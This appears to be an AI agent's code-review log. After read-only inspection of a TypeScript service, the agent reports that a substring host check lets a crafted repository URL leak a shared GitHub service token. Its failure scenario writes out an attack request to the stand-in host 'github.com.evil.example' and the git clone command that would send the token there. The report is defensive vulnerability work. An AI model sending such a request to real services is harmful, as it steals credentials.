content.text: I'll start by reading the two files named in the issue.

input.description: Show git-auth.ts and worktree.ts with line numbers

input.command: ls -R . | grep -v node_modules | head -60; echo ---; grep -rn "cloneRepo\|gitAuthArgs\|remoteUrl" --include=*.ts --include=*.js --include=*.json --include=*.md . | grep -v node_modules
input.description: List repo tree and find all references to cloneRepo, gitAuthArgs, remoteUrl

input.command: cat -n src/routes.ts; echo ---STORE; cat -n src/store.ts; echo ---CONFIG; cat -n src/config.ts; echo ---PKG; cat package.json; echo ---TESTS; find . -path ./node_modules -prune -o \( -name "*.test.*" -o -name "*.spec.*" -o -name "__tests__" \) -print
input.description: Show routes.ts, store.ts, config.ts, package.json and locate any test files

input.reason: gitAuthArgs in src/git-auth.ts:8 decides whether to attach the GitHub service token using `remoteUrl.includes("github.com")`, a plain substring test. It does not parse the URL or compare the host, so any URL containing that string anywhere (hostname suffix, path, or userinfo) passes and gets `-c http.extraHeader=Authorization: Bearer <token>` (line 9). cloneRepo in src/worktree.ts:15 calls gitAuthArgs(repo.remoteUrl, SERVICE_TOKEN) and then runs `git clone repo.remoteUrl`, so the header is sent to whatever host the URL names; http.extraHeader is a process-wide git option, not scoped to github.com. The URL is fully user-controlled: registerRepo in src/routes.ts:19-22 reads remoteUrl from req.body, checks only that it is non-empty, and passes it to store.insertRepo (no validation, src/store.ts:16-18) and cloneRepo. SERVICE_TOKEN is a single shared HARBOR_GITHUB_TOKEN (src/config.ts:4). There is no host allowlist, URL parser, or test anywhere in src/ that would prevent this, and the repo has no test files.
input.failure_scenario: An authenticated user calls registerRepo (src/routes.ts:18) with body `{ id: "x", remoteUrl: "https://github.com.evil.example/x.git" }`. The presence check on line 20 passes. cloneRepo (src/worktree.ts:15) calls gitAuthArgs, whose `includes("github.com")` test on src/git-auth.ts:8 matches, so git is invoked as `git -c "http.extraHeader=Authorization: Bearer <HARBOR_GITHUB_TOKEN>" clone https://github.com.evil.example/x.git …`. Git connects to the attacker's server and sends the service token in the Authorization header; the attacker's HTTP log now contains the token.
input.severity_reason: This is an exploitable secret-exfiltration flaw reachable by any authenticated user via a normal API call with a single crafted field. The leaked value is the shared HARBOR_GITHUB_TOKEN service credential (src/config.ts:4) used for all repositories, so one request compromises the service's entire GitHub access. No configuration or code in the repository mitigates it.
